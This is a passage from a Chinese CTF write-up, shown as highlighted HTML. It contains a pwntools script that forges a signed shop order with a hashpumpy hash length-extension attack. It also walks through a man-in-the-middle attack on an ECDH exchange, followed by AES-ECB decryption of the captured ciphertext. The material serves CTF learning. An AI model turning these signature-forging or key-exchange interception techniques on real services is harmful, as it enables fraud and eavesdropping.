<span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'Product ID:'</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'9'</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'Your order:'</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">a</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">timestamp</span><span class="o">=</span><span class="n">a</span><span class="p">[</span><span class="mi">35</span><span class="p">:</span><span class="mi">51</span><span class="p">]</span>
<span class="n">sign</span><span class="o">=</span><span class="n">a</span><span class="p">[</span><span class="mi">57</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="k">print</span> <span class="n">a</span>
<span class="k">print</span> <span class="n">timestamp</span>
<span class="k">print</span> <span class="n">sign</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">sign</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="mi">32</span><span class="p">):</span>
<span class="n">hax</span><span class="o">=</span><span class="n">hashpumpy</span><span class="o">.</span><span class="n">hashpump</span><span class="p">(</span><span class="n">sign</span><span class="p">,</span><span class="s1">'product=Flag&amp;price=99999&amp;timestamp='</span><span class="o">+</span><span class="n">timestamp</span><span class="p">,</span><span class="s1">'&amp;product=Flag&amp;price=9&amp;timestamp='</span><span class="o">+</span><span class="n">timestamp</span><span class="p">,</span><span class="n">i</span><span class="p">)</span>
    <span class="c1">#print hax</span>
    <span class="n">payload</span><span class="o">=</span><span class="n">hax</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="s1">'&amp;sign='</span><span class="o">+</span><span class="n">hax</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="c1">#print payload</span>
    <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'Command:'</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'3'</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'Your order:'</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">pp</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="k">print</span> <span class="n">pp</span>
    <span class="k">if</span> <span class="s2">"Order"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">pp</span><span class="p">:</span>
        <span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<h3 data-content="1" id="3e9f6a440f6bf80471b16a7fdbeb1d0d"><strong>ECDH</strong></h3>
<p>查阅资料得到：<a href="https://github.com/esxgx/easy-ecc" target="_blank">https://github.com/esxgx/easy-ecc</a></p>
<p>和几个关键字：ECDH、secp128r1、AES、ECB<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100939-2eac99de-5d65-1.png"/></p>
<p>github项目有4个函数：生成密钥、计算共享密钥、签名、验证签名</p>
<p>首先要问Alice和bob的公钥，然后交换给对方，Alice才会说出密文，Bob只会把密文告诉Alice</p>
<p>大概就是用中间人攻击获取明文</p>
<p>emm。。现在会生成密钥对了，但是不知道怎么解密。。</p>
<p>使用自己的私钥和Bob的公钥生成的共享密钥 解<br/>
Alice发出的密文：失败（其实是可以成功，就是要自己写脚本）</p>
<p><strong>过程：</strong></p>
<p>生成自己的密钥对<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100939-2eb9cece-5d65-1.png"/></p>
<p>找bob要pubkey，顺便把自己的pubkey作为alice的pubkey给bob<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100939-2ee46dfa-5d65-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100939-2eef6a7a-5d65-1.png"/></p>
<p>结合自己的prikey和bob的pubkey生成shared_key<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100939-2efbe1b0-5d65-1.png"/></p>
<p>找bob把flag发给alice，再去alice那边接收密文<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100939-2f05707c-5d65-1.png"/></p>
<p>用shared_key作为密钥，用AES的ECB模式解密Alice给的密文<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100939-2f10b982-5d65-1.png"/></p>
<div class="highlight"><pre><span></span><span class="c1"># -*- coding: utf-8 -*-</span>
<span class="c1"># aes_decrypt.py</span>
<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">b2a_hex</span><span class="p">,</span> <span class="n">a2b_hex</span>

<span class="k">class</span> <span class="nc">AESCrypto</span><span class="p">():</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">key</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">key</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">mode</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span>

    <span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">text</span><span class="p">):</span>
        <span class="n">cryptor</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">key</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">mode</span><span class="p">,</span><span class="sa">b</span><span class="s1">'0000000000000000'</span><span class="p">)</span>
        <span class="n">plain_text</span>  <span class="o">=</span> <span class="n">cryptor</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">a2b_hex</span><span class="p">(</span><span class="n">text</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">plain_text</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">p_secret</span> <span class="o">=</span> <span class="s1">'841747f83b3367c2331069ef167d0179'</span>
    <span class="k">print</span> <span class="s2">"key:       "</span><span class="p">,</span><span class="n">p_secret</span>
    <span class="n">pc</span> <span class="o">=</span> <span class="n">AESCrypto</span><span class="p">(</span><span class="n">a2b_hex</span><span class="p">(</span><span class="n">p_secret</span><span class="p">))</span>
    <span class="n">e</span> <span class="o">=</span> <span class="s1">'1d6002b9d8d721039c602a8c46fb4e2ea96d1bacf28e3c41635ea493df02f80e'</span>
    <span class="n">d</span> <span class="o">=</span> <span class="n">pc</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
    <span class="k">print</span> <span class="s2">"ciphertext:"</span><span class="p">,</span><span class="n">e</span>
    <span class="k">print</span> <span class="s2">"decrypt:   "</span><span class="p">,</span><span class="n">d</span>
</pre></div>
</div>
</div>